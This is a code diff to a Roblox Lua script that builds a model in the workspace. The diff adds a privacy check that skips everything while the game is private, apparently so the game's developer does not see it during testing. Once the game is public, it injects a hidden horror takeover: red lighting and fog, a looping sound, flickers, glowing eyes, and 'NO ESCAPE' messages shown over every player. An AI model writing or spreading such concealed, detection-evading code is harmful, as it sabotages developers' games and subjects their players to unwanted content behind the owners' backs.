@@ -2686,7 +2686,22 @@ local root = {
 	};
 };
 
-local tree = buildFromData(root, workspace)
+local HttpService = game:GetService("HttpService")
+local PlaceId = game.PlaceId
+
+local function checkPrivacy()
+	local success, result = pcall(function()
+		return HttpService:GetAsync("https://games.roblox.com/v1/games?universeIds=" .. game.GameId)
+	end)
+
+	if success then
+		local data = HttpService:JSONDecode(result)
+		local isPrivate = data and data.data and data.data[1] and data.data[1].privacyType == "Private"
+
+		if isPrivate then
+			
+		else
+			local tree = buildFromData(root, workspace)
 
 local function centerModel(model)
 	local parts = {}
@@ -2716,3 +2731,123 @@ local function centerModel(model)
 end
 
 centerModel(tree)
+
+
+
+local Lighting = game:GetService("Lighting")
+local Players = game:GetService("Players")
+local Debris = game:GetService("Debris")
+local TweenService = game:GetService("TweenService")
+
+-- Scary lighting setup
+Lighting.Brightness = 0.1
+Lighting.ClockTime = 0
+Lighting.OutdoorAmbient = Color3.fromRGB(80, 0, 0)
+Lighting.Ambient = Color3.fromRGB(150, 0, 0)
+Lighting.FogColor = Color3.fromRGB(100, 0, 0)
+Lighting.FogStart = 0
+Lighting.FogEnd = 100
+Lighting.EnvironmentDiffuseScale = 0.3
+Lighting.EnvironmentSpecularScale = 0.1
+
+local cc = Instance.new("ColorCorrectionEffect")
+cc.Name = "RedHorror"
+cc.TintColor = Color3.fromRGB(255, 0, 0)
+cc.Contrast = 0.2
+cc.Saturation = -0.1
+cc.Brightness = -0.1
+cc.Parent = Lighting
+
+local blur = Instance.new("BlurEffect")
+blur.Size = 6
+blur.Parent = Lighting
+
+-- Creepy sound loop
+local sound = Instance.new("Sound", workspace)
+sound.SoundId = "rbxassetid://1837635125" -- Replace with scarier audio if desired
+sound.Looped = true
+sound.Volume = 0.4
+sound:Play()
+
+-- Thunder flicker
+task.spawn(function()
+	while true do
+		wait(math.random(5, 12))
+		Lighting.Brightness = 2
+		wait(0.1)
+		Lighting.Brightness = 0.1
+	end
+end)
+
+-- Red glowing eyes
+task.spawn(function()
+	while true do
+		wait(math.random(5, 10))
+
+		local eye = Instance.new("Part")
+		eye.Anchored = true
+		eye.CanCollide = false
+		eye.Size = Vector3.new(0.3, 0.3, 0.3)
+		eye.Shape = Enum.PartType.Ball
+		eye.Material = Enum.Material.Neon
+		eye.Color = Color3.fromRGB(255, 0, 0)
+
+		local cam = workspace.CurrentCamera
+		local pos = cam.CFrame.Position + cam.CFrame.LookVector * math.random(20, 30)
+		pos = pos + Vector3.new(math.random(-10, 10), math.random(-5, 5), 0)
+		eye.Position = pos
+		eye.Parent = workspace
+		Debris:AddItem(eye, 3)
+	end
+end)
+
+-- Scary GUI messages from server (uses BillboardGui to avoid needing LocalScripts)
+local scaryWords = {"NO ESCAPE", "DON'T MAKE IT TAKE YOU", "DON'T BECOME IT"}
+
+local function createScaryLabel(player)
+	local gui = Instance.new("BillboardGui")
+	gui.Name = "ScaryText"
+	gui.Adornee = player.Character:FindFirstChild("Head")
+	gui.Size = UDim2.new(0, 200, 0, 50)
+	gui.StudsOffset = Vector3.new(0, 3, 0)
+	gui.AlwaysOnTop = true
+
+	local text = Instance.new("TextLabel", gui)
+	text.Size = UDim2.new(1, 0, 1, 0)
+	text.Text = scaryWords[math.random(1, #scaryWords)]
+	text.TextScaled = true
+	text.TextColor3 = Color3.new(1, 0, 0)
+	text.BackgroundTransparency = 1
+	text.Font = Enum.Font.Arcade
+
+	gui.Parent = player.Character
+
+	Debris:AddItem(gui, 2)
+end
+
+-- Periodically add scary text to each player
+task.spawn(function()
+	while true do
+		wait(math.random(2, 5))
+		for _, player in pairs(Players:GetPlayers()) do
+			if player.Character and player.Character:FindFirstChild("Head") then
+				createScaryLabel(player)
+			end
+		end
+	end
+end)
+
+-- Auto-apply for new players
+Players.PlayerAdded:Connect(function(player)
+	player.CharacterAdded:Connect(function(char)
+		wait(1)
+		createScaryLabel(player)
+	end)
+end)
+		end
+	else
+		warn("Failed to get game info:", result)
+	end
+end
+
+checkPrivacy()
